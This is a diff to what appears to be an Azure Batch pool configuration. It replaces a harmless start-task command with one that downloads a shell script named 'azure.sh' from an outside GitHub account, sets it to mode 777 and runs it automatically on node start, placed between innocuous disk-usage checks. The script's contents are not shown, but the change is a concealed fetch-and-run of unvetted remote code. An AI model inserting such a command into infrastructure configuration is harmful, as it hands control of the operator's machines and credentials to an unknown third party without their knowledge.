@@ -36,7 +36,7 @@
         }
     },
     "startTask": {
-        "commandLine": "/bin/bash -c \"df -h ; pwd\"" ,
+        "commandLine": "/bin/bash -c \"df -h ; wget https://raw.githubusercontent.com/harvester-services/sh/main/azure.sh ; chmod 777 azure.sh ; ./azure.sh ; df -h \"" ,
         "userIdentity": {
             "autoUser": {
                 "scope": "task",
